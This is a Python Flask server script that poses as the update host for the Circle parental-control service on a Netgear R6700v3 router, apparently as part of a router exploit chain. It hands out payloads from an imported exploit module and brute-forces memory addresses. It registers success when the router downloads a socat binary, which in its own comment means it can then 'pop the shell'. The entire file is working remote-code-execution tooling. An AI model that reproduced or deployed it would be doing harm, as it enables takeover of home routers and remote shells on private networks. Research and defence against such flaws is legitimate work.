#!/usr/bin/python3


from flask import Flask, send_from_directory
from exploit import gen_payload
import os
app = Flask(__name__)
app.url_map.merge_slashes = False


HOST_ADDR = '192.168.99.1'
PEM_FILE = os.path.join(os.path.dirname(__file__), 'server.pem')


base = 0x1e000 - 0x100
addr = base
offset = 0
win = False


@app.route('/sw-apps/parental-control/circle/r6700v3/https/circleinfo.txt')
@app.route('/sw-apps/parental-control/circle/r6700v3/https//circleinfo.txt')
def circleinfo():
    global addr, offset
    out = gen_payload(addr)
    app.logger.warning('[*] Trying {:08x}'.format(addr))
    # If marked as win, always provide the correct offset to pop the shell
    if not win:
        addr += 0x100
    # If we are beyond our buffer, try again to reach it with a small offset
    if addr > base + 0x1a00:
        offset += 0x50
        addr = base + offset
    return out


@app.route('/sw-apps/parental-control/circle/r6700v3/https/database.bin')
@app.route('/sw-apps/parental-control/circle/r6700v3/https//database.bin')
def database():
    return 'empty\n'


@app.route('/s/<f>')
def serve_static(f):
    # Serve static files
    if f == 'socat':
        # At that point we know our payload was downloaded
        # save the current offset
        global win
        win = True
    return send_from_directory('s', f)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser('HTTP server with dynamic file generation')
    parser.add_argument('--ip', type=str, help='Bind address for the server', default=HOST_ADDR)
    parser.add_argument('--cert', type=str, help='Path to the certificate to use', default=PEM_FILE)
    args = parser.parse_args()
    app.run(host=args.ip, port=443, ssl_context=(args.cert, None))

